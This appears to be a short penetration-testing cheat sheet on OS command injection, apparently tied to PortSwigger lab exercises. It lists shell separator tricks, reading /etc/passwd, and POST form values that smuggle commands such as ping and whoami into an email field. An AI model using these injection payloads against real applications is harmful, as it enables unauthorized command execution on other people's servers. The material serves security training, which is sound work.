- Command Injection/Execution :
```sh
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful
0x0a or \n #Newline 

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```

- Detecting blind OS command injection :
```sh
& ping -c 10 127.0.0.1 &
#Request Post :
name=dede&email=test%40gmail.com||+ping+-c+10+127.0.0.1+||&subject=dede&message=deeeeeeeeeeee
```

`Don't forget to try every possibilities !`

- Output redirection: 
```sh
name=test&email=||whoami>/var/www/images/output.txt||&subject=test&message=test
```

 **Blind OS command injection with out-of-band interaction**
 
 Lab :https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band

 **Blind OS command injection with out-of-band data exfiltration**

Lab : https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration